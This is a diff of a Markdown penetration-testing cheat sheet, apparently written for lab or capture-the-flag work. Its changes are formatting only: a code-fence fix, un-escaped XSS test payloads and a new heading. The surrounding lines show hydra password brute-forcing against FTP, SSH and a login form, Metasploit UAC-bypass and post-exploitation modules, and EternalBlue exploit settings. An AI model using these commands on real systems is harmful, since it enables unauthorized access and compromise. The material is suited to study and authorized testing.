@@ -114,7 +114,7 @@ mysql -u <user> -p<password>
 hydra -L userslist -P passwordslist ftp://10.10.10.10
 hydra -l root -P passwordslist ssh://10.10.10.10 
 hydra -L userlist -p password123 ftp://10.10.10.10
-```sh
+```          
 
 **HTTP POST Form**
 ```sh
@@ -126,10 +126,10 @@ hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^
 
 ## XSS
 ```sh
-\<script\>alert(1)\</script\>
-\<ScRiPt\>alert(1)\</ScRiPt\>
-\<script\>alert('XSS')\</script\>
-\<ScRiPt\>alert('XSS')\</ScRiPt\>
+<script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert('XSS')</script>
+<ScRiPt>alert('XSS')</ScRiPt>
 ```
 *This is a great filter bypass cheatsheet*\
 https://owasp.org/www-community/xss-filter-evasion-cheatsheet
@@ -209,7 +209,7 @@ run post/windows/gather/win_privs
 exploit/windows/local/bypassuac
 set session
 ```
-** MS17-010 EternalBlue SMB Remote**
+## MS17-010 EternalBlue SMB Remote
 ```sh
 exploit(windows/smb/ms17_010_psexec)> set RHOST </Target-IP\>
 exploit(windows/smb/ms17_010_psexec)> set LHOST </Attacker-IP\>
